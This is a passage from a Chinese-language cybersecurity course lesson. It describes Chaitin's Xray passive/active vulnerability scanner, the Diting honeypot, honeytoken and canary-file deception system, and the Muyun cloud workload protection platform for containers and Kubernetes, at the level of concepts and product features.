# Day 44 · 长亭洞鉴Xray & 谛听欺骗防御 & 牧云CWPP

> **学习阶段**：第二层 — 长亭科技  
> **学习时长**：约 120 分钟  
> **难度等级**：中高级  
> **前置知识**：漏洞扫描基础、蜜罐概念、容器/K8s基础  
> **学习目标**：了解洞鉴被动+主动扫描、掌握谛听欺骗防御体系、了解牧云CWPP云原生安全、完成第二层厂商全部学习  

---

## 目录

1. [开篇：长亭的全栈安全版图](#1-开篇长亭的全栈安全版图)
2. [洞鉴Xray产品概述](#2-洞鉴xray产品概述)
3. [洞鉴的被动扫描引擎](#3-洞鉴的被动扫描引擎)
4. [洞鉴的主动扫描引擎](#4-洞鉴的主动扫描引擎)
5. [洞鉴的漏洞管理平台](#5-洞鉴的漏洞管理平台)
6. [谛听欺骗防御体系概述](#6-谛听欺骗防御体系概述)
7. [蜜罐：以假乱真的陷阱](#7-蜜罐以假乱真的陷阱)
8. [蜜标：诱人的虚假凭证](#8-蜜标诱人的虚假凭证)
9. [蜜饵：精心布置的诱饵文件](#9-蜜饵精心布置的诱饵文件)
10. [谛听欺骗防御的完整攻击链检测](#10-谛听欺骗防御的完整攻击链检测)
11. [谛听 vs 传统IDS：主动防御 vs 被动检测](#11-谛听-vs-传统ids主动防御-vs-被动检测)
12. [谛听的部署策略](#12-谛听的部署策略)
13. [牧云CWPP产品概述](#13-牧云cwpp产品概述)
14. [容器安全深度解析](#14-容器安全深度解析)
15. [Kubernetes安全](#15-kubernetes安全)
16. [主机安全与云原生统一防护](#16-主机安全与云原生统一防护)
17. [长亭全产品线协同](#17-长亭全产品线协同)
18. [第二层厂商学习总结](#18-第二层厂商学习总结)
19. [实操实验：部署Cowrie蜜罐模拟谛听欺骗防御](#19-实操实验部署cowrie蜜罐模拟谛听欺骗防御)
20. [实验一：部署Cowrie SSH蜜罐](#20-实验一部署cowrie-ssh蜜罐)
21. [实验二：配置蜜罐诱饵](#21-实验二配置蜜罐诱饵)
22. [实验三：攻击模拟与告警验证](#22-实验三攻击模拟与告警验证)
23. [实验四：部署OpenCanary多协议蜜罐](#23-实验四部署opencanary多协议蜜罐)
24. [验收练习](#24-验收练习)
25. [今日总结](#25-今日总结)

---

## 1. 开篇：长亭的全栈安全版图

昨天我们深入学习了长亭科技的旗舰产品——雷池WAF及其革命性的语义分析引擎。今天，我们将完成长亭科技另外三款核心产品的学习：洞鉴Xray（漏洞扫描）、谛听（欺骗防御）和牧云（CWPP云原生安全）。

这四款产品构成了长亭科技的全栈安全版图：

```
长亭科技安全版图

        雷池WAF（SafeLine）
        Web应用防火墙
        · 语义分析引擎
        · 误报<0.01%
        · 社区版免费
              │
    ┌─────────┼─────────┐
    │         │         │
洞鉴Xray    谛听       牧云
漏洞扫描   欺骗防御    CWPP
    │         │         │
被动+主动  蜜罐+蜜标  容器+K8s
漏洞管理    +蜜饵      +主机安全

四者协同：
洞鉴发现漏洞 → 雷池虚拟补丁 → 谛听监控异常 → 牧云防护云原生
```

> 如果把长亭科技比作一支特种部队：雷池是"精确制导导弹"（精准拦截），洞鉴是"侦察卫星"（发现弱点），谛听是"诱饵陷阱"（主动欺骗），牧云是"基地防御"（云原生保护）。

---

## 2. 洞鉴Xray产品概述

### 2.1 什么是洞鉴Xray？

**洞鉴Xray**是长亭科技的漏洞扫描与漏洞管理平台。名字中的"洞鉴"意为"洞察明鉴"——深入洞察系统的安全漏洞。

洞鉴Xray最大的特色是**被动扫描+主动扫描双引擎**：

```
传统漏洞扫描器（被动扫描）：
→ 主动发送探测请求到目标
→ 分析响应判断是否存在漏洞
→ 问题：可能影响业务、被WAF拦截、无法发现某些逻辑漏洞

洞鉴Xray的独特优势：
→ 被动扫描：分析正常业务流量，从流量中发现漏洞
→ 主动扫描：传统方式的漏洞探测
→ 两者结合：覆盖面更广，准确度更高
```

### 2.2 被动扫描 vs 主动扫描

| 维度 | 被动扫描 | 主动扫描 |
|------|----------|----------|
| **原理** | 分析正常业务流量 | 主动发送探测请求 |
| **数据来源** | 镜像流量/代理流量 | 扫描器自己构造 |
| **对业务影响** | 零影响 | 可能产生脏数据 |
| **发现漏洞类型** | 反射型漏洞、信息泄露 | 所有类型漏洞 |
| **速度** | 实时（随流量分析） | 依赖扫描速度 |
| **被WAF拦截风险** | 无（不主动发包） | 有（可能被WAF拦截） |
| **适用场景** | 生产环境、持续监控 | 上线前检查、定期扫描 |

> 类比：被动扫描 = 看监控录像发现可疑行为；主动扫描 = 派巡逻队逐一检查。各有优劣，配合使用效果最佳。

---

## 3. 洞鉴的被动扫描引擎

### 3.1 被动扫描工作原理

```
被动扫描工作流程：

用户正常业务流量
    │
    ▼
┌──────────────┐
│  流量镜像/代理 │  ← 从交换机镜像端口或代理获取流量
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  流量解析      │  ← 解析HTTP请求和响应
│  · URL       │
│  · 参数      │
│  · Header    │
│  · Body      │
│  · 响应内容   │
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  漏洞特征匹配  │  ← 在流量中匹配漏洞特征
│  · 敏感信息   │     （如响应中的密码、错误堆栈）
│  · 错误配置   │
│  · 信息泄露   │
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  被动漏洞发现  │  ← 生成漏洞报告
└──────────────┘
```

### 3.2 被动扫描能发现的漏洞类型

```
被动扫描可发现的漏洞：

1. 信息泄露类
   ├── 响应中包含数据库错误信息
   ├── 响应中包含堆栈跟踪
   ├── 响应中包含内网IP地址
   ├── 响应中包含密码/Token/密钥
   ├── 服务器版本信息泄露
   └── 目录列表泄露

2. 配置缺陷类
   ├── 缺少安全响应头（HSTS/CSP/X-Frame-Options等）
   ├── Cookie缺少Secure/HttpOnly标志
   ├── CORS配置过于宽松
   └── HTTPS未强制

3. 反射型漏洞
   ├── 反射型XSS（参数值原样返回在响应中）
   ├── 反射型JSONP劫持
   └── 敏感参数在URL中明文传输

4. 逻辑缺陷类
   ├── 越权访问（通过对比不同用户的响应）
   ├── 参数污染
   └── 异常HTTP方法处理
```

### 3.3 被动扫描的优势场景

```
被动扫描的独特价值：

场景1：生产环境持续监控
→ 不能主动扫描（可能影响业务）
→ 被动分析流量，实时发现新漏洞
→ 例如：开发人员不小心在响应中返回了调试信息

场景2：发现已绕过WAF的攻击
→ 攻击者绕过了WAF
→ 攻击流量到达了后端
→ 被动扫描从响应中发现攻击成功的迹象

场景3：发现隐藏的API
→ 从流量中自动发现未文档化的API
→ 发现影子IT和未经授权的接口
```

---

## 4. 洞鉴的主动扫描引擎

### 4.1 主动扫描工作原理

```
主动扫描工作流程：

┌──────────────┐
│  目标输入      │  ← URL、IP段、域名
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  信息收集      │  ← 端口扫描、服务识别、指纹识别
│  · 开放端口   │
│  · 运行服务   │
│  · 中间件版本 │
│  · 框架识别   │
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  爬虫         │  ← 爬取网站结构和所有页面
│  · URL发现   │
│  · 参数提取   │
│  · 表单识别   │
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  漏洞探测      │  ← 发送PoC（漏洞验证代码）
│  · SQL注入   │
│  · XSS       │
│  · 命令注入   │
│  · 文件包含   │
│  · SSRF      │
│  · 反序列化   │
│  · ...       │
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  漏洞验证      │  ← 验证漏洞是否真实存在
│  · 无害验证   │
│  · 精确判断   │
│  · 避免误报   │
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  生成报告      │  ← 漏洞详情+修复建议+风险评级
└──────────────┘
```

### 4.2 洞鉴的PoC体系

洞鉴内置了丰富的漏洞检测PoC（Proof of Concept，概念验证代码），覆盖主流漏洞类型：

```
洞鉴PoC覆盖范围：

Web通用漏洞：
├── SQL注入（MySQL/Oracle/PostgreSQL/SQL Server/MongoDB）
├── XSS（反射型/存储型/DOM型）
├── 命令注入
├── 代码注入
├── 文件包含（LFI/RFI）
├── 文件上传
├── SSRF
├── XXE
├── 反序列化
├── 模板注入（SSTI）
├── CSRF
└── 逻辑漏洞

中间件漏洞：
├── Apache Struts2系列（S2-001 ~ S2-062）
├── Apache Tomcat系列
├── Nginx配置缺陷
├── IIS漏洞
├── Weblogic系列
├── JBoss系列
├── Spring Boot Actuator
└── Fastjson反序列化

CMS/框架漏洞：
├── WordPress插件漏洞
├── Drupal漏洞
├── ThinkPHP漏洞
├── Laravel漏洞
├── Django漏洞
└── 各类开源系统漏洞
```

---

## 5. 洞鉴的漏洞管理平台

### 5.1 漏洞全生命周期管理

洞鉴不仅仅是一个扫描器，更是一个**漏洞管理平台**：

```
漏洞全生命周期管理：

[发现] → [验证] → [评估] → [分配] → [修复] → [验证] → [关闭]
   ↑                                                         │
   └─────────────────────────────────────────────────────────┘
                          持续循环

每个阶段的功能：
1. 发现：被动+主动扫描发现漏洞
2. 验证：人工/自动验证漏洞真实性（排除误报）
3. 评估：CVSS评分 + 资产重要性 + 业务影响
4. 分配：分配给相应的开发/运维团队
5. 修复：提供修复建议和验证方案
6. 验证：修复后重新扫描验证
7. 关闭：确认修复后关闭漏洞
```

### 5.2 漏洞风险评级

```
洞鉴的漏洞评级体系：

严重（Critical）- CVSS 9.0-10.0
├── 可直接获取服务器权限
├── 可获取数据库全部数据
└── 示例：Struts2远程代码执行

高危（High）- CVSS 7.0-8.9
├── 可获取敏感数据
├── 可进行越权操作
└── 示例：SQL注入、任意文件读取

中危（Medium）- CVSS 4.0-6.9
├── 信息泄露
├── 配置缺陷
└── 示例：目录列表、缺少安全头

低危（Low）- CVSS 0.1-3.9
├── 理论风险
├── 难以利用
└── 示例：内部IP泄露、Cookie未设HttpOnly
```

---

## 6. 谛听欺骗防御体系概述

### 6.1 什么是欺骗防御？

**欺骗防御（Deception Technology）**是一种主动安全防御策略。核心思想是：**在网络中布置大量的"假目标"（蜜罐、蜜标、蜜饵），诱使攻击者触碰这些假目标，一旦触碰就触发告警**。

> 类比：欺骗防御 = 在博物馆里放置的"假名画"和隐藏的"报警器"。小偷以为偷到了真迹，实际上触发了一系列警报，安保人员早已在出口等着他。

### 6.2 为什么欺骗防御有效？

```
传统检测的困境：
→ 攻击者知道你在检测什么
→ 攻击者会避开你的检测规则
→ 检测总是被动的、滞后的

欺骗防御的优势：
→ 攻击者不知道什么是真的、什么是假的
→ 攻击者必须触碰目标才能达成目的
→ 一旦触碰假目标，100%确定是攻击行为（无误报！）
→ 从被动防御变为主动诱捕
```

### 6.3 谛听的三大核心组件

```
谛听欺骗防御体系 = 蜜罐 + 蜜标 + 蜜饵

┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  蜜罐（Honeypot）                                           │
│  · 模拟真实的服务和应用                                      │
│  · SSH蜜罐、RDP蜜罐、MySQL蜜罐、Web蜜罐...                  │
│  · 攻击者连接后记录所有操作                                  │
│  · 作用：吸引攻击者、研究攻击手法                            │
│                                                             │
│  蜜标（Honey Token）                                        │
│  · 嵌入在真实系统中的虚假凭证                                │
│  · 假数据库账号、假API密钥、假Cookie                        │
│  · 一旦被使用就触发告警                                      │
│  · 作用：检测已渗透到内网的攻击者                            │
│                                                             │
│  蜜饵（Honey File / Canary File）                           │
│  · 放置在关键位置的诱饵文件                                  │
│  · 假密码文件、假配置文件、假数据库备份                      │
│  · 一旦被访问/打开就触发告警                                 │
│  · 作用：检测数据窃取行为                                    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 7. 蜜罐：以假乱真的陷阱

### 7.1 蜜罐的工作原理

```
蜜罐工作流程：

攻击者扫描网络
    │
    ▼
发现"开放端口"（蜜罐模拟的）
    │
    ▼
连接蜜罐服务（以为是真的服务器）
    │
    ▼
蜜罐记录：
├── 攻击者IP
├── 攻击时间
├── 使用的工具
├── 执行的命令
├── 下载/上传的文件
└── 攻击者的行为模式
    │
    ▼
┌──────────────┐
│  触发告警     │  ← 100%确定是攻击行为
│  收集情报     │  ← 了解攻击者TTP（战术、技术、过程）
│  联动响应     │  ← SOAR自动封禁攻击IP
└──────────────┘
```

### 7.2 谛听支持的蜜罐类型

```
谛听蜜罐类型：

网络服务蜜罐：
├── SSH蜜罐（模拟Linux SSH服务，记录暴力破解和登录后操作）
├── RDP蜜罐（模拟Windows远程桌面，记录登录尝试）
├── Telnet蜜罐（模拟Telnet服务，捕获IoT设备攻击）
├── FTP蜜罐（模拟FTP服务，记录文件上传/下载）
├── SMB蜜罐（模拟Windows文件共享，捕获勒索病毒传播）
└── VNC蜜罐（模拟远程桌面）

数据库蜜罐：
├── MySQL蜜罐（模拟MySQL服务，记录SQL查询和脱库行为）
├── Redis蜜罐（模拟Redis，捕获未授权访问和写入SSH key）
├── MongoDB蜜罐（模拟MongoDB，捕获数据窃取）
├── Elasticsearch蜜罐（模拟ES，捕获数据泄露）
└── Oracle蜜罐（模拟Oracle数据库服务）

Web应用蜜罐：
├── Web蜜罐（模拟各类Web应用漏洞）
├── WordPress蜜罐（模拟WordPress站点）
├── phpMyAdmin蜜罐（模拟数据库管理工具）
├── Jenkins蜜罐（模拟CI/CD平台）
└── 自定义Web蜜罐

工控蜜罐：
├── Modbus蜜罐（模拟工控协议）
├── S7Comm蜜罐（模拟西门子PLC）
└── BACnet蜜罐（模拟楼宇自动化）
```

### 7.3 SSH蜜罐的工作原理（以Cowrie为例）

```
SSH蜜罐详细工作流程：

1. 蜜罐监听22端口
   攻击者扫描到22端口开放

2. 攻击者尝试SSH连接
   ssh root@蜜罐IP

3. 蜜罐接受任何用户名/密码组合
   （但全部记录！）
   记录：用户名=root, 密码=admin123

4. 攻击者"成功登录"
   进入蜜罐模拟的Shell环境

5. 蜜罐模拟真实Linux环境
   ├── 模拟文件系统（/etc /var /home等）
   ├── 模拟命令（ls, cat, wget, curl等）
   ├── 模拟网络连接
   └── 所有操作被完整记录

6. 攻击者的操作被记录：
   ├── 执行的命令
   ├── 下载的文件（蜜罐保存副本）
   ├── 尝试的内网扫描
   └── 上传的恶意软件样本

7. 安全团队获得：
   ├── 攻击者IP和来源
   ├── 攻击工具和手法
   ├── 恶意软件样本
   └── 攻击者意图
```

---

## 8. 蜜标：诱人的虚假凭证

### 8.1 什么是蜜标？

**蜜标（Honey Token）**是嵌入在真实系统中的虚假凭证信息，看起来像真的，但实际上是被监控的"诱饵"。

> 类比：蜜标 = 银行给每个柜员配的"报警钞票"——看起来是真钞，但一旦被使用，就会触发无声警报。

### 8.2 蜜标的类型

```
蜜标类型：

数据库蜜标：
├── 假数据库账号（在真实数据库中创建）
│   例：db_backup_user / BackupPass2024!
│   监控：任何使用该账号的连接 → 告警
├── 假数据表
│   例：employee_salary_backup
│   监控：任何查询该表的操作 → 告警
└── 假数据记录
    例：在用户表中插入假管理员账号
    监控：任何人查询该假账号 → 告警

文件系统蜜标：
├── 假配置文件
│   例：/etc/db_credentials.conf（包含假密码）
│   监控：任何人读取该文件 → 告警
└── 假SSH密钥
    例：~/.ssh/id_rsa_honeytoken
    监控：任何人使用该密钥 → 告警

应用蜜标：
├── 假API密钥
│   例：在代码仓库中放置假AWS密钥
│   监控：任何使用该密钥的API调用 → 告警
├── 假Cookie/Session
│   例：在Web应用中注入假Session ID
│   监控：任何使用该Session的请求 → 告警
└── 假URL
    例：/admin/backup/secret_config.xml
    监控：任何访问该URL的请求 → 告警
```

### 8.3 蜜标的关键设计原则

```
蜜标设计原则：

1. 逼真性
   → 看起来必须像真实凭证
   → 命名符合组织的命名规范
   → 具有合理的权限和内容

2. 唯一性
   → 每个蜜标都是唯一的
   → 一旦被触发，能精确追踪到是哪个蜜标

3. 可监控性
   → 必须能够监控到蜜标被使用
   → 触发后立即告警

4. 无害性
   → 蜜标不能给攻击者提供真正的权限
   → 假凭证只能访问蜜罐环境
   → 即使攻击者使用了蜜标，也不能造成实际损害

5. 隐蔽性
   → 蜜标不能被攻击者轻易识别
   → 不能有明显标记（如文件名包含"honeytoken"）
```

---

## 9. 蜜饵：精心布置的诱饵文件

### 9.1 什么是蜜饵？

**蜜饵（Honey File / Canary File）**是放置在网络中的诱饵文件，用于检测数据窃取和未授权访问行为。

> "Canary File"的名字来自煤矿中的"金丝雀"——矿工带金丝雀下矿，如果金丝雀死了，说明有有毒气体，矿工立即撤离。蜜饵文件就是网络安全中的"金丝雀"。

### 9.2 蜜饵的类型和部署

```
蜜饵部署策略：

Windows环境：
├── 桌面放置"密码.txt"（包含假密码）
├── "薪资表_2026.xlsx"（假的敏感文件）
├── "客户数据备份.zip"
├── "VPN配置.ovpn"
└── 注册表中放置假凭据

Linux环境：
├── /home/user/credentials.txt
├── /tmp/backup_script.sh（含假数据库密码）
├── /var/www/html/backup.sql
├── ~/.aws/credentials（假AWS密钥）
└── /etc/mysql_backup.conf

文件服务器：
├── "财务数据_机密"
├── "员工档案_完整版"
├── "源代码_完整备份"
└── "合同扫描件"

每个蜜饵文件包含：
├── 嵌入的追踪标识（如特殊的字符串或水印）
├── 文件访问监控（通过文件系统审计）
├── 网络外传监控（DLP/网络审计）
└── 触发告警机制
```

### 9.3 蜜饵的监控机制

```
蜜饵监控技术：

方法一：文件系统审计
→ 使用auditd（Linux）或Windows文件审计
→ 监控蜜饵文件的访问、打开、复制、移动操作
→ 一旦触发 → 立即告警

方法二：嵌入Web Beacon
→ 在蜜饵文件（如HTML/PDF/Word）中嵌入远程资源引用
→ 攻击者打开文件时 → 自动请求远程资源
→ 服务器收到请求 → 记录攻击者IP、时间、环境信息

方法三：水印追踪
→ 在蜜饵文件中嵌入唯一的水印标识
→ 通过DLP系统检测水印标识的外传
→ 一旦检测到 → 告警并定位泄露源头

方法四：网络流量监控
→ 监控蜜饵文件的MD5/SHA256哈希值
→ 在网络出口检测匹配的文件外传
→ 一旦检测到 → 告警
```

---

## 10. 谛听欺骗防御的完整攻击链检测

### 10.1 攻击链 vs 欺骗防御链

谛听的最大价值在于能够**覆盖攻击链的多个阶段**：

```
攻击链阶段（MITRE ATT&CK）          谛听欺骗防御
─────────────────────────         ────────────────────
1. 侦察（Reconnaissance）
   攻击者扫描网络                    → 蜜罐暴露"开放端口"
                                     攻击者被吸引到蜜罐

2. 初始访问（Initial Access）
   攻击者利用漏洞进入系统             → 蜜罐记录攻击手法
                                     收集攻击工具样本

3. 横向移动（Lateral Movement）
   攻击者在内网移动                   → 蜜标检测横向移动
                                     假凭证被使用 → 告警

4. 凭据访问（Credential Access）
   攻击者窃取密码                     → 蜜标（假密码）被使用
                                     识别攻击者已进入内网

5. 数据收集（Collection）
   攻击者搜索敏感文件                 → 蜜饵被访问
                                     检测数据收集行为

6. 数据渗出（Exfiltration）
   攻击者外传数据                     → 蜜饵水印被外传
                                     追踪数据泄露
```

### 10.2 完整的欺骗防御流程

```
攻击者入侵 → 欺骗防御响应

时间线：

T+0min: 攻击者扫描网络，发现SSH蜜罐
        → 蜜罐记录扫描行为
        → 低优先级告警（扫描很常见）

T+5min: 攻击者暴力破解SSH蜜罐
        → 蜜罐记录所有尝试的用户名和密码
        → 中优先级告警

T+10min: 攻击者"成功登录"蜜罐
         → 蜜罐开始记录所有操作
         → 高优先级告警 → 通知安全团队

T+15min: 攻击者在蜜罐中下载工具，尝试内网扫描
         → 蜜罐记录所有命令和下载的文件
         → 获取攻击工具样本

T+20min: 攻击者使用蜜罐中发现的"假凭证"尝试连接真实系统
         → 蜜标触发告警！
         → 确认攻击者已经从蜜罐进入真实网络

T+21min: SOAR自动响应：
         → 封禁攻击者IP
         → 隔离受影响网段
         → 通知安全团队
         → 启动应急响应流程
```

---

## 11. 谛听 vs 传统IDS：主动防御 vs 被动检测

### 11.1 核心差异

```
传统IDS/IPS（被动检测）：
┌─────────────────────────────────────────────────────┐
│                                                     │
│  流量 → 规则匹配 → 发现已知攻击 → 告警              │
│                                                     │
│  问题：                                             │
│  · 只能检测已知攻击（有签名的）                      │
│  · 误报率高（正常流量也可能匹配规则）                │
│  · 加密流量无法检测                                 │
│  · 攻击者可以绕过（知道检测规则）                    │
│                                                     │
└─────────────────────────────────────────────────────┘

谛听欺骗防御（主动诱捕）：
┌─────────────────────────────────────────────────────┐
│                                                     │
│  布置假目标 → 攻击者触碰 → 100%确定是攻击 → 告警    │
│                                                     │
│  优势：                                             │
│  · 误报率接近0%（正常用户不会触碰蜜罐）              │
│  · 可检测未知攻击（不需要签名）                      │
│  · 不依赖流量分析                                   │
│  · 攻击者无法规避（不知道哪个是蜜罐）                │
│  · 可以收集攻击者的TTP（战术、技术、过程）           │
│                                                     │
└─────────────────────────────────────────────────────┘
```

### 11.2 详细对比

| 对比维度 | 传统IDS/IPS | 谛听欺骗防御 |
|----------|------------|-------------|
| **检测原理** | 规则/签名匹配 | 攻击者触碰假目标 |
| **误报率** | 较高（5-30%） | 极低（<1%） |
| **漏报率** | 可能较高（未知攻击） | 取决于蜜罐覆盖范围 |
| **检测已知攻击** | ★★★★ | ★★★★ |
| **检测未知攻击** | ★★ | ★★★★★ |
| **加密流量** | 无法检测 | 不影响（蜜罐在应用层） |
| **攻击溯源** | 有限 | 完整记录攻击行为 |
| **威胁情报** | 依赖外部 | 自产（从蜜罐收集） |
| **部署复杂度** | 中 | 低（蜜罐即服务） |
| **维护成本** | 高（规则更新） | 低（蜜罐自维护） |
| **对攻击者的威慑** | 低 | 高（增加攻击不确定性） |

---

## 12. 谛听的部署策略

### 12.1 蜜罐部署位置

```
蜜罐部署策略：

┌─────────────────────────────────────────────────────────────┐
│                        互联网                                │
│                          │                                  │
│                    ┌─────▼─────┐                            │
│                    │  边界防火墙 │                            │
│                    └─────┬─────┘                            │
│                          │                                  │
│              ┌───────────┼───────────┐                      │
│              │           │           │                      │
│        ┌─────▼─────┐ ┌──▼────┐ ┌───▼──────┐               │
│        │ DMZ蜜罐    │ │WAF   │ │ 真实Web   │               │
│        │ (外网诱捕) │ │      │ │  服务器   │               │
│        └───────────┘ └──────┘ └──────────┘               │
│                                                             │
│              ┌──────────────────────────┐                   │
│              │       内网                │                   │
│              │                          │                   │
│        ┌─────▼─────┐  ┌─────▼─────┐     │                   │
│        │ 内网蜜罐    │  │ 蜜标/蜜饵  │     │                   │
│        │ (横向移动)  │  │ (凭据/文件) │     │                   │
│        └───────────┘  └───────────┘     │                   │
│                                         │                   │
│              ┌──────────────────────────┘                   │
└─────────────────────────────────────────────────────────────┘

分层部署策略：
1. 外网层：高交互蜜罐（吸引外部攻击者）
2. DMZ层：Web蜜罐（检测Web攻击）
3. 内网层：服务蜜罐+蜜标+蜜饵（检测已渗透的攻击者）
```

### 12.2 蜜罐的交互级别

| 级别 | 交互深度 | 示例 | 风险 | 信息量 |
|------|----------|------|------|--------|
| **低交互** | 模拟服务响应 | 端口监听、Banner返回 | 极低 | 少（仅连接信息） |
| **中交互** | 模拟应用层交互 | SSH登录、简单命令 | 低 | 中（登录凭据、命令） |
| **高交互** | 真实操作系统 | 完整虚拟机环境 | 高 | 多（完整行为记录） |

---

## 13. 牧云CWPP产品概述

### 13.1 什么是CWPP？

**CWPP（Cloud Workload Protection Platform，云工作负载保护平台）**是Gartner定义的一个安全产品类别，专门用于保护云环境中的工作负载（容器、Kubernetes、虚拟机、无服务器等）。

> 传统安全产品保护的是"物理服务器"或"虚拟机"，CWPP保护的是"云原生工作负载"——容器、Pod、Serverless函数。

### 13.2 牧云的保护范围

```
牧云CWPP保护范围：

┌─────────────────────────────────────────────────────────────┐
│                    牧云CWPP                                  │
│                                                             │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐      │
│  │  容器安全     │  │  K8s安全     │  │  主机安全     │      │
│  │              │  │              │  │              │      │
│  │ · 镜像扫描   │  │ · 集群合规   │  │ · 入侵检测   │      │
│  │ · 运行时防护 │  │ · RBAC审计  │  │ · 漏洞管理   │      │
│  │ · 漏洞管理   │  │ · 网络策略   │  │ · 合规检查   │      │
│  │ · 配置检查   │  │ · Pod安全   │  │ · 文件完整性 │      │
│  │ · 密钥检测   │  │ · 准入控制   │  │ · 日志审计   │      │
│  └──────────────┘  └──────────────┘  └──────────────┘      │
│                                                             │
│  ┌─────────────────────────────────────────────────────┐   │
│  │              统一安全运营                              │   │
│  │  · 统一告警  · 统一策略  · 可视化大屏  · API对接     │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

---

## 14. 容器安全深度解析

### 14.1 容器安全的四个阶段

```
容器安全生命周期：

阶段一：开发阶段（镜像构建）
├── 基础镜像安全（使用官方/受信任的基础镜像）
├── 依赖包漏洞扫描
├── 密钥检测（防止密钥写入镜像）
├── Dockerfile最佳实践检查
└── 镜像签名和验证

阶段二：分发阶段（镜像仓库）
├── 镜像仓库访问控制
├── 镜像漏洞持续扫描
├── 镜像安全策略（只允许使用经过审批的镜像）
└── 镜像完整性验证

阶段三：部署阶段（Kubernetes）
├── Pod安全上下文（SecurityContext）
├── 准入控制（Admission Control）
├── 网络策略（Network Policy）
└── 资源限制（防止资源耗尽）

阶段四：运行阶段（运行时防护）
├── 运行时行为监控
├── 异常进程检测
├── 容器逃逸检测
├── 网络异常检测
└── 文件完整性监控
```

### 14.2 容器镜像扫描

牧云对容器镜像进行深度安全扫描：

```
镜像扫描内容：

1. 操作系统层漏洞
   ├── Alpine/Debian/Ubuntu/CentOS包漏洞
   └── CVE数据库匹配

2. 应用依赖漏洞
   ├── Python: requirements.txt / Pipfile
   ├── Node.js: package.json / package-lock.json
   ├── Java: pom.xml / build.gradle
   ├── Go: go.mod
   └── Ruby: Gemfile

3. 配置缺陷
   ├── 以root用户运行
   ├── 敏感目录挂载
   ├── 特权模式运行
   ├── 危险Capability
   └── 未使用非root用户

4. 密钥泄露
   ├── 硬编码密码
   ├── API密钥/Token
   ├── SSH私钥
   ├── 证书文件
   └── 数据库连接字符串

扫描结果示例：
┌──────────┬──────────┬──────────┬─────────────────────┐
│ 严重程度  │  数量    │  类型     │  示例               │
├──────────┼──────────┼──────────┼─────────────────────┤
│ CRITICAL │    3     │ CVE漏洞   │ CVE-2024-xxx 9.8分 │
│ HIGH     │   12     │ CVE漏洞   │ OpenSSL漏洞         │
│ MEDIUM   │   25     │ 配置缺陷  │ 以root运行          │
│ LOW      │    8     │ 最佳实践  │ 未使用健康检查      │
└──────────┴──────────┴──────────┴─────────────────────┘
```

---

## 15. Kubernetes安全

### 15.1 K8s安全挑战

```
Kubernetes安全攻击面：

┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  1. API Server安全                                          │
│     ├── 未授权访问（Anonymous Auth）                         │
│     ├── RBAC配置不当（权限过大）                             │
│     └── 审计日志未开启                                       │
│                                                             │
│  2. etcd安全                                                │
│     ├── 未加密存储                                           │
│     ├── 未启用TLS                                           │
│     └── 未授权访问                                           │
│                                                             │
│  3. Pod安全                                                 │
│     ├── 特权容器（privileged: true）                         │
│     ├── 挂载宿主机敏感目录（hostPath）                       │
│     ├── 未设置资源限制                                       │
│     ├── 容器以root运行                                       │
│     └── 使用hostNetwork/hostPID                             │
│                                                             │
│  4. 网络策略                                                 │
│     ├── 未配置NetworkPolicy                                  │
│     ├── 所有Pod互通（默认）                                  │
│     └── 缺少入口/出口控制                                    │
│                                                             │
│  5. 密钥管理                                                 │
│     ├── Secret未加密                                        │
│     ├── Secret以明文在环境变量中                             │
│     └── 密钥未轮换                                           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 15.2 牧云的K8s安全检测

```
牧云K8s安全检测能力：

1. 集群合规检查
   ├── CIS Kubernetes Benchmark对标
   ├── 等保2.0云扩展要求
   └── 自定义合规策略

2. RBAC权限审计
   ├── 发现过度授权的角色
   ├── 检测未使用的权限
   ├── 识别危险的ClusterRole
   └── 权限变更告警

3. 运行时安全
   ├── 异常Pod创建检测
   ├── 容器逃逸检测
   ├── 挖矿行为检测
   ├── 反弹Shell检测
   └── 敏感文件访问检测

4. 镜像合规
   ├── 只允许使用受信任仓库的镜像
   ├── 禁止使用latest标签
   └── 镜像扫描结果必须通过策略
```

---

## 16. 主机安全与云原生统一防护

### 16.1 牧云的主机安全功能

虽然牧云定位为CWPP，但它也提供了必要的主机安全能力：

```
牧云主机安全功能：

├── 入侵检测
│   ├── 反弹Shell检测
│   ├── WebShell检测
│   ├── 提权行为检测
│   └── 可疑进程检测
│
├── 漏洞管理
│   ├── 系统漏洞扫描
│   ├── 应用漏洞扫描
│   └── 漏洞修复跟踪
│
├── 合规基线
│   ├── CIS Benchmark
│   ├── 等保2.0基线
│   └── 自定义基线
│
├── 文件完整性监控
│   ├── 关键系统文件监控
│   ├── 配置文件变更告警
│   └── Web目录文件监控
│
└── 日志审计
    ├── 系统日志采集
    ├── 安全日志分析
    └── 日志合规存储
```

---

## 17. 长亭全产品线协同

### 17.1 四款产品协同场景

```
长亭全栈安全方案协同：

场景1：Web攻击检测与响应链
攻击者 → 雷池WAF检测SQL注入 → 拦截攻击
      → 如果绕过WAF → 洞鉴被动扫描发现异常响应
      → 谛听蜜罐捕获攻击者后续行为
      → 牧云检测攻击者是否向容器环境横向移动

场景2：漏洞发现到修复闭环
洞鉴发现漏洞 → 评估风险 → 分配给开发团队
             → 雷池配置虚拟补丁（临时防护）
             → 开发团队修复代码
             → 洞鉴重新扫描验证
             → 漏洞关闭

场景3：攻击溯源
谛听蜜罐捕获攻击 → 收集攻击者TTP
                 → 雷池检查历史日志，看是否有类似攻击
                 → 洞鉴检查是否利用了已知漏洞
                 → 牧云检查容器是否被感染
```

---

## 18. 第二层厂商学习总结

### 18.1 第二层厂商全览

经过Day 37-44的学习，我们已经完成了第二层三家厂商（启明星辰、安恒信息、长亭科技）的全部课程：

```
第二层厂商学习总结

启明星辰（Day 37-39）—— 安全管理专家
├── 天阗IDS/IPS：入侵检测与防御
├── 天清WAF：Web应用防火墙
└── 泰合SOC：安全管理平台（五大模块）
